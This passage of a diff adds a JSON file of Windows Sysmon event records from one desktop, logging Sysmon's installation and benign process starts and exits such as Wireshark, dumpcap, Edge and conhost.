@@ -1,0 +1,4477 @@
+{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 16
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 16,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252794.2268016
+   },
+   "EventRecordID": 1,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 3644,
+    "ThreadID": 2480
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-21-2664003694-224353874-4161542076-1001"
+   }
+  },
+  "EventData": {
+   "UtcTime": "2023-02-24 15:33:14.223",
+   "Configuration": "\"C:\\Users\\wade\\Downloads\\Sysmon64.exe\" -i",
+   "ConfigurationFileHash": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 4
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 4,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252794.7094383
+   },
+   "EventRecordID": 2,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "UtcTime": "2023-02-24 15:33:14.694",
+   "State": "Started",
+   "Version": "14.14",
+   "SchemaVersion": "4.83"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252794.7172368
+   },
+   "EventRecordID": 3,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:14.246",
+   "ProcessGuid": "10DA3E43-D8BA-63F8-8900-000000000900",
+   "ProcessId": 4288,
+   "Image": "C:\\Windows\\Sysmon64.exe",
+   "FileVersion": "14.14",
+   "Description": "System activity monitor",
+   "Product": "Sysinternals Sysmon",
+   "Company": "Sysinternals - www.sysinternals.com",
+   "OriginalFileName": "-",
+   "CommandLine": "C:\\Windows\\Sysmon64.exe",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=7108EC59A69D858BFB3F6034C4812C2D7EC348ECC952FD30C65A913C17F68E35",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 604,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252794.717624
+   },
+   "EventRecordID": 4,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:14.615",
+   "ProcessGuid": "10DA3E43-D8BA-63F8-8A00-000000000900",
+   "ProcessId": 4948,
+   "Image": "C:\\Windows\\System32\\wbem\\unsecapp.exe",
+   "FileVersion": "10.0.19041.610 (WinBuild.160101.0800)",
+   "Description": "Sink to receive asynchronous callbacks for WMI client application",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "unsecapp.dll",
+   "CommandLine": "C:\\Windows\\system32\\wbem\\unsecapp.exe -Embedding",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "NT AUTHORITY\\SYSTEM",
+   "LogonGuid": "10DA3E43-6524-63F9-E703-000000000000",
+   "LogonId": 999,
+   "TerminalSessionId": 0,
+   "IntegrityLevel": "System",
+   "Hashes": "SHA256=5CD0DD3B1454B437362C87C651EE2068AC27CDB725AA1C705CF62FF325A759CC",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252795.5525408
+   },
+   "EventRecordID": 5,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:15.548",
+   "ProcessGuid": "10DA3E43-D8B7-63F8-8300-000000000900",
+   "ProcessId": 3644,
+   "Image": "C:\\Users\\wade\\Downloads\\Sysmon64.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252797.898728
+   },
+   "EventRecordID": 6,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:17.876",
+   "ProcessGuid": "10DA3E43-D8A7-63F8-6E00-000000000900",
+   "ProcessId": 4480,
+   "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252797.9223745
+   },
+   "EventRecordID": 7,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:17.913",
+   "ProcessGuid": "10DA3E43-D8A7-63F8-6F00-000000000900",
+   "ProcessId": 4488,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252801.5905952
+   },
+   "EventRecordID": 8,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:21.417",
+   "ProcessGuid": "10DA3E43-D8C1-63F8-8B00-000000000900",
+   "ProcessId": 5280,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "COM Surrogate",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "dllhost.exe",
+   "CommandLine": "C:\\Windows\\system32\\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+   "CurrentDirectory": "C:\\Windows\\system32\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10",
+   "ParentProcessGuid": "00000000-0000-0000-0000-000000000000",
+   "ParentProcessId": 736,
+   "ParentImage": "-",
+   "ParentCommandLine": "-",
+   "ParentUser": "-"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252804.018056
+   },
+   "EventRecordID": 9,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:23.918",
+   "ProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ProcessId": 5356,
+   "Image": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Wireshark",
+   "Product": "Wireshark",
+   "Company": "The Wireshark developer community, https://www.wireshark.org/",
+   "OriginalFileName": "Wireshark.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=99ED6B3FC027975A87FAA3E09ECB6000623AD3FA5FFC3A02290848BE4AEDBB0C",
+   "ParentProcessGuid": "10DA3E43-D893-63F8-5600-000000000900",
+   "ParentProcessId": 2688,
+   "ParentImage": "C:\\Windows\\explorer.exe",
+   "ParentCommandLine": "C:\\Windows\\Explorer.EXE",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252806.79376
+   },
+   "EventRecordID": 10,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:26.785",
+   "ProcessGuid": "10DA3E43-D8C1-63F8-8B00-000000000900",
+   "ProcessId": 5280,
+   "Image": "C:\\Windows\\System32\\dllhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252806.921816
+   },
+   "EventRecordID": 11,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:26.848",
+   "ProcessGuid": "10DA3E43-D8C6-63F8-8D00-000000000900",
+   "ProcessId": 5444,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "FileVersion": "110.0.1587.50",
+   "Description": "Microsoft Edge",
+   "Product": "Microsoft Edge",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedge.exe",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=4652 --field-trial-handle=2184,i,12503708684359893713,13292805670728289041,131072 /prefetch:8",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\110.0.1587.50\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=470EA019C1EA8882B258DEA27E77261DD297EB225FD08EDBE591C82796189D75",
+   "ParentProcessGuid": "10DA3E43-D8A8-63F8-7100-000000000900",
+   "ParentProcessId": 4580,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.0220735
+   },
+   "EventRecordID": 12,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:26.916",
+   "ProcessGuid": "10DA3E43-D8C6-63F8-8E00-000000000900",
+   "ProcessId": 5452,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "FileVersion": "110.0.1587.50",
+   "Description": "Microsoft Edge",
+   "Product": "Microsoft Edge",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "msedge.exe",
+   "CommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=utility --utility-sub-type=chrome.mojom.UtilWin --lang=en-US --service-sandbox-type=none --mojo-platform-channel-handle=4620 --field-trial-handle=2184,i,12503708684359893713,13292805670728289041,131072 /prefetch:8",
+   "CurrentDirectory": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\110.0.1587.50\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=470EA019C1EA8882B258DEA27E77261DD297EB225FD08EDBE591C82796189D75",
+   "ParentProcessGuid": "10DA3E43-D8A8-63F8-7100-000000000900",
+   "ParentProcessId": 4580,
+   "ParentImage": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "ParentCommandLine": "\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --no-startup-window --win-session-start /prefetch:5",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.2750528
+   },
+   "EventRecordID": 13,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.270",
+   "ProcessGuid": "10DA3E43-D8C6-63F8-8D00-000000000900",
+   "ProcessId": 5444,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.2766817
+   },
+   "EventRecordID": 14,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.270",
+   "ProcessGuid": "10DA3E43-D8C6-63F8-8E00-000000000900",
+   "ProcessId": 5452,
+   "Image": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.8986032
+   },
+   "EventRecordID": 15,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.887",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-8F00-000000000900",
+   "ProcessId": 5536,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Dumpcap",
+   "Product": "Dumpcap",
+   "Company": "The Wireshark developer community",
+   "OriginalFileName": "Dumpcap.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -D -Z none",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=8DC9CB75BE241F559878CE18DB3CF2E52D0CB3A312509F11F741B1A4F7498C5D",
+   "ParentProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ParentProcessId": 5356,
+   "ParentImage": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.9179745
+   },
+   "EventRecordID": 16,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.900",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9000-000000000900",
+   "ProcessId": 5544,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+   "CurrentDirectory": "C:\\Windows",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=57B0CCD3AEBC6C7126E7C19F5DAC492DF51D904A505C5F5B0CB02270D53F8684",
+   "ParentProcessGuid": "10DA3E43-D8C7-63F8-8F00-000000000900",
+   "ParentProcessId": 5536,
+   "ParentImage": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -D -Z none",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.9841073
+   },
+   "EventRecordID": 17,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.974",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-8F00-000000000900",
+   "ProcessId": 5536,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252807.9961567
+   },
+   "EventRecordID": 18,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.986",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9100-000000000900",
+   "ProcessId": 5572,
+   "Image": "C:\\Program Files\\Wireshark\\dumpcap.exe",
+   "FileVersion": "4.0.3",
+   "Description": "Dumpcap",
+   "Product": "Dumpcap",
+   "Company": "The Wireshark developer community",
+   "OriginalFileName": "Dumpcap.exe",
+   "CommandLine": "\"C:\\Program Files\\Wireshark\\dumpcap.exe\" -i \\Device\\NPF_{18BA4954-86CF-484A-ABA2-DBBA09EE4EE6} -L --list-time-stamp-types -Z none",
+   "CurrentDirectory": "C:\\Program Files\\Wireshark\\",
+   "User": "DESKTOP-UTDHED2\\wade",
+   "LogonGuid": "10DA3E43-D892-63F8-4B6D-030000000000",
+   "LogonId": 224587,
+   "TerminalSessionId": 1,
+   "IntegrityLevel": "Medium",
+   "Hashes": "SHA256=8DC9CB75BE241F559878CE18DB3CF2E52D0CB3A312509F11F741B1A4F7498C5D",
+   "ParentProcessGuid": "10DA3E43-D8C3-63F8-8C00-000000000900",
+   "ParentProcessId": 5356,
+   "ParentImage": "C:\\Program Files\\Wireshark\\Wireshark.exe",
+   "ParentCommandLine": "\"C:\\Program Files\\Wireshark\\Wireshark.exe\" ",
+   "ParentUser": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 5
+   },
+   "Version": 3,
+   "Level": 4,
+   "Task": 5,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.000952
+   },
+   "EventRecordID": 19,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.994",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9000-000000000900",
+   "ProcessId": 5544,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "User": "DESKTOP-UTDHED2\\wade"
+  },
+  "Message": ""
+ }{
+  "System": {
+   "Provider": {
+    "Name": "Microsoft-Windows-Sysmon",
+    "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9"
+   },
+   "EventID": {
+    "Value": 1
+   },
+   "Version": 5,
+   "Level": 4,
+   "Task": 1,
+   "Opcode": 0,
+   "Keywords": 9223372036854775808,
+   "TimeCreated": {
+    "SystemTime": 1677252808.0033455
+   },
+   "EventRecordID": 20,
+   "Correlation": {},
+   "Execution": {
+    "ProcessID": 4288,
+    "ThreadID": 5172
+   },
+   "Channel": "Microsoft-Windows-Sysmon/Operational",
+   "Computer": "DESKTOP-UTDHED2",
+   "Security": {
+    "UserID": "S-1-5-18"
+   }
+  },
+  "EventData": {
+   "RuleName": "-",
+   "UtcTime": "2023-02-24 15:33:27.998",
+   "ProcessGuid": "10DA3E43-D8C7-63F8-9200-000000000900",
+   "ProcessId": 5580,
+   "Image": "C:\\Windows\\System32\\conhost.exe",
+   "FileVersion": "10.0.19041.546 (WinBuild.160101.0800)",
+   "Description": "Console Window Host",
+   "Product": "Microsoft® Windows® Operating System",
+   "Company": "Microsoft Corporation",
+   "OriginalFileName": "CONHOST.EXE",
+   "CommandLine": "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
